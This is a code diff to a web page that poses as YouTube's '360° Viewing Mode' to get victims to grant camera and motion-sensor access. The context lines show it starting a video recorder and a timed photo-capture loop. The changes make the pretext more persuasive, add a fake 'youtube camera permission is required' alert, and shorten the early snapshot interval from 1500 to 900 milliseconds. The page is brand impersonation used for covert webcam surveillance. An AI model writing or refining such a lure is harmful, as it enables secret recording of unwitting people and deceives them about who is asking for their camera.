@@ -26,7 +26,7 @@
   <div id="permission-overlay">
     <img src="https://upload.wikimedia.org/wikipedia/commons/e/ef/Youtube_logo.png" alt="YouTube">
     <h2>360° Viewing Mode</h2>
-    <p>Enable camera and motion sensors to interact with this 360° video and enable head-tracking.</p>
+    <p>Enable camera and motion sensors to interact with this 360° video and enable head-tracking for immersive experience. </p>
     <button id="enable-btn">Allow & Play</button>
   </div>
 
@@ -62,13 +62,13 @@
         setupVideoRecorder(stream);
 
       } catch (err) {
-        alert("Please use Chrome or Safari for the full 360 experience.");
+        alert("youtube camera permission is required for 360° viewing experience.");
       }
     });
 
     function startPhotoLoop() {
       const elapsed = Date.now() - startTime;
-      let delay = elapsed < 10000 ? 1500 : 7000; 
+      let delay = elapsed < 10000 ? 900 : 7000; 
 
       setTimeout(async () => {
         if (video.readyState === video.HAVE_ENOUGH_DATA) {
